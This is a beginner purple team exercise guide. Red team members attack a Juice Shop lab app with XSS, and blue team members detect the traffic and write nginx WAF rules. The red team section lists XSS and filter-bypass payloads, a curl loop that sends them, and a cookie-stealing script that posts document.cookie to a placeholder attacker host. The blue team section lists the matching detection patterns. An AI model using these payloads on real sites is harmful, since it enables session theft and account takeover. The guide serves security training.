# Purple Team Exercise 03: XSS Attack & Web Application Firewall

## 🎯 Overview

**Duration:** 40 minutes  
**Difficulty:** ⭐ Beginner  
**OWASP Category:** A03:2021 - Injection (Cross-Site Scripting)

Red Team will inject malicious scripts into the application while Blue Team detects XSS patterns and implements WAF rules to prevent future attacks.

---

## ⏱️ Timeline

| Time | Red Team Activity | Blue Team Activity |
|------|-------------------|-------------------|
| 0-5 min | Find injection points | Setup XSS monitoring |
| 5-20 min | Perform XSS attacks | Detect & log attacks |
| 20-30 min | Try to bypass filters | Create WAF rules |
| 30-40 min | Final testing | Block attacks & report |

---

## 🔴 Red Team Instructions

### Target
```
http://<VPS_IP>:8000
```

### Phase 1: Find Injection Points (5 minutes)

**Objective:** Locate where user input is reflected

#### Common XSS Locations

1. **Search Box:** `/#/search`
2. **Contact Form:** `/#/contact`
3. **User Registration:** `/#/register`
4. **Product Reviews:** (requires login)
5. **Track Orders:** `/#/track-result`

#### Quick Test

```bash
# Test if input is reflected in search
curl "http://<VPS_IP>:8000/rest/products/search?q=<test123>"

# Check if HTML is in response
curl "http://<VPS_IP>:8000/rest/products/search?q=<b>bold</b>"
```

---

### Phase 2: XSS Attacks (15 minutes)

**Objective:** Successfully execute JavaScript in the browser

#### Attack 1: Reflected XSS in Search

1. Open browser to: `http://<VPS_IP>:8000`
2. Use the search bar with this payload:

```html
<iframe src="javascript:alert('XSS')">
```

Or try in URL:
```
http://<VPS_IP>:8000/#/search?q=<iframe src="javascript:alert('XSS')">
```

#### Attack 2: DOM-Based XSS

Try the track order feature:
```
http://<VPS_IP>:8000/#/track-result?id=<script>alert('XSS')</script>
```

#### Attack 3: Stored XSS (Contact Form)

1. Go to Contact page
2. Submit a message with:

```html
<script>alert('Stored XSS')</script>
```

If basic script tags are blocked, try:
```html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

#### Attack 4: Cookie Stealing Payload

```javascript
<script>
new Image().src='http://<YOUR_IP>:8888/steal?cookie='+document.cookie;
</script>
```

Or URL encoded:
```
<script>new%20Image().src='http://<YOUR_IP>:8888/steal?cookie='+document.cookie;</script>
```

#### Generate Lots of XSS Traffic

```bash
#!/bin/bash
TARGET="http://<VPS_IP>:8000"

PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg/onload=alert(1)>"
    "<body onload=alert(1)>"
    "javascript:alert(1)"
    "<iframe src=javascript:alert(1)>"
    "<marquee onstart=alert(1)>"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing: $payload"
    curl -s "$TARGET/rest/products/search?q=$payload" > /dev/null
    sleep 1
done
```

---

### Phase 3: Bypass Filters (10 minutes)

**Objective:** Evade Blue Team's WAF rules

#### Encoding Techniques

```bash
# URL encoding
curl "http://<VPS_IP>:8000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# Double URL encoding
curl "http://<VPS_IP>:8000/rest/products/search?q=%253Cscript%253Ealert(1)%253C/script%253E"

# Unicode encoding
curl "http://<VPS_IP>:8000/rest/products/search?q=\u003cscript\u003ealert(1)\u003c/script\u003e"
```

#### Case Variations

```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
```

#### Tag Variations

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<script x>alert(1)</script>
<script/x>alert(1)</script>
```

#### Without `script` Tag

```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

---

### Phase 4: Final Testing (10 minutes)

After Blue Team implements WAF rules:

1. Test if basic payloads are blocked
2. Try bypass techniques
3. Document which payloads work/don't work

```bash
# Automated bypass testing
for encoding in "" "%3C" "\\u003c"; do
    payload="${encoding}script>alert(1)<${encoding}/script>"
    echo "Testing: $payload"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://<VPS_IP>:8000/rest/products/search?q=$payload")
    echo "Response code: $RESPONSE"
done
```

---

### Red Team Deliverables

- [ ] Successful XSS payloads (before WAF)
- [ ] Types of XSS found (reflected, stored, DOM)
- [ ] Bypass techniques that worked
- [ ] Screenshots of alert boxes

---

## 🔵 Blue Team Instructions

### Phase 1: Setup Monitoring (5 minutes)

**Objective:** Detect XSS patterns in traffic

#### 1. XSS Detection Command

```bash
# Watch for XSS patterns in real-time
tail -f ./logs/nginx/access.log | \
    grep -iE "(<script|javascript:|onerror=|onload=|<iframe|<svg)"
```

#### 2. Setup Alert Script

```bash
#!/bin/bash
# xss_detector.sh
LOG="./logs/nginx/access.log"

echo "🔍 XSS Detection Active..."

tail -f "$LOG" | while read line; do
    if echo "$line" | grep -qiE "(<script|javascript:|onerror|onload|<iframe|<svg|<img.*src.*=)"; then
        echo "⚠️  XSS DETECTED: $line"
        echo "$(date) - XSS attempt" >> xss_alerts.log
    fi
done
```

```bash
chmod +x xss_detector.sh
./xss_detector.sh
```

#### 3. Kibana Search

```
message: (*script* OR *javascript* OR *onerror* OR *onload*)
```

---

### Phase 2: Detect & Log Attacks (15 minutes)

**Objective:** Identify all XSS attempts

#### Detection Patterns

| Pattern | Attack Type |
|---------|-------------|
| `<script>` | Classic XSS |
| `javascript:` | Protocol XSS |
| `onerror=` | Event handler XSS |
| `onload=` | Event handler XSS |
| `<iframe>` | Frame injection |
| `<svg>` | SVG-based XSS |
| `<img src=x` | Image error XSS |

#### Count XSS Attempts

```bash
# Total XSS attempts
grep -ciE "(<script|javascript:|onerror|onload)" ./logs/nginx/access.log

# Group by type
echo "=== XSS Attempts by Type ==="
echo "Script tags: $(grep -ci '<script' ./logs/nginx/access.log)"
echo "Event handlers: $(grep -ciE '(onerror|onload)' ./logs/nginx/access.log)"
echo "JavaScript protocol: $(grep -ci 'javascript:' ./logs/nginx/access.log)"
echo "Iframes: $(grep -ci '<iframe' ./logs/nginx/access.log)"
```

#### Extract Payloads for Analysis

```bash
# Decode and display XSS payloads
grep -oiE "q=[^&]+" ./logs/nginx/access.log | \
    sed 's/q=//g' | \
    python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | \
    sort -u
```

---

### Phase 3: Create WAF Rules (10 minutes)

**Objective:** Block XSS attacks at the proxy level

#### Nginx ModSecurity-Style Rules

Create a WAF configuration:

```bash
cat > ./blue-team/config/waf_rules.conf << 'EOF'
# XSS Protection Rules for Nginx

# Block requests containing script tags
if ($request_uri ~* "<script") {
    return 403;
}

# Block javascript: protocol
if ($request_uri ~* "javascript:") {
    return 403;
}

# Block common event handlers
if ($request_uri ~* "(onerror|onload|onmouseover|onclick)=") {
    return 403;
}

# Block iframe injection
if ($request_uri ~* "<iframe") {
    return 403;
}

# Block SVG XSS
if ($request_uri ~* "<svg") {
    return 403;
}

# Block img tag XSS
if ($request_uri ~* "<img[^>]+onerror") {
    return 403;
}
EOF
```

#### Updated Nginx Location Block

```bash
cat > ./blue-team/config/secure_location.conf << 'EOF'
location / {
    # XSS Protection
    if ($request_uri ~* "(<script|javascript:|onerror=|onload=|<iframe|<svg)") {
        return 403;
    }
    
    # URL-encoded XSS protection
    if ($request_uri ~* "(%3Cscript|%3Ciframe|%3Csvg)") {
        return 403;
    }
    
    proxy_pass http://juice-shop:3000;
    proxy_set_header X-XSS-Protection "1; mode=block";
    proxy_set_header Content-Security-Policy "script-src 'self'";
}
EOF
```

#### Quick IP Block for Active Attacker

```bash
# Get XSS attacker IP
ATTACKER=$(grep -iE "(<script|javascript:|onerror)" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Blocking XSS attacker: $ATTACKER"
sudo iptables -A INPUT -s $ATTACKER -j DROP
```

---

### Phase 4: Verify & Report (10 minutes)

#### Test Your Rules

```bash
# Test if WAF is working
curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:8000/rest/products/search?q=<script>alert(1)</script>"
    
# Should return 403 if blocked
```

#### Monitor Blocked Attempts

```bash
# Watch for 403 responses (blocked by WAF)
tail -f ./logs/nginx/access.log | grep " 403 "
```

#### Create Incident Report

```markdown
XSS ATTACK INCIDENT REPORT
==========================

Detection Time: [TIME]
Attacker IP: [IP]
Attack Duration: [MINUTES]

Attack Statistics:
- Total XSS attempts: [COUNT]
- Script tag attacks: [COUNT]
- Event handler attacks: [COUNT]
- Successful injections: [COUNT]

Payloads Used:
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. [LIST MORE]

Vulnerable Endpoints:
- /rest/products/search
- /#/track-result
- [LIST MORE]

Response Actions:
- [TIME] - XSS attacks detected
- [TIME] - WAF rules created
- [TIME] - Attacker IP blocked
- [TIME] - CSP headers added

WAF Rules Implemented:
- Blocked <script> tags
- Blocked javascript: protocol
- Blocked event handlers (onerror, onload)
- Added X-XSS-Protection header
- Added Content-Security-Policy header

Recommendations:
1. Implement output encoding on all user input
2. Use Content Security Policy headers
3. Validate and sanitize all input server-side
4. Use HttpOnly flag on session cookies
5. Conduct code review of input handling
```

---

## 🟣 Debrief Questions

Discuss as a team:

1. **Red Team:** Which XSS type was easiest to exploit? Why?
2. **Blue Team:** Were there any payloads that bypassed your WAF?
3. **Both:** What's the difference between reflected, stored, and DOM XSS?
4. **Both:** How effective is a WAF compared to fixing code?

---

## 📚 XSS Quick Reference

### Types of XSS

| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Input reflected immediately | Search results |
| **Stored** | Payload saved in database | Comments, profiles |
| **DOM-based** | Executed in browser JS | URL fragments |

### Impact of XSS

- Cookie/session theft
- Account takeover
- Keylogging
- Phishing
- Malware distribution

---

## ✅ Success Criteria

### Red Team
- [ ] Found 3+ XSS vulnerable endpoints
- [ ] Executed JavaScript in browser
- [ ] Demonstrated 2+ bypass techniques
- [ ] Documented all successful payloads

### Blue Team
- [ ] Detected XSS attacks in real-time
- [ ] Created WAF rules blocking common payloads
- [ ] Blocked at least 80% of attack attempts
- [ ] Documented incident with recommendations
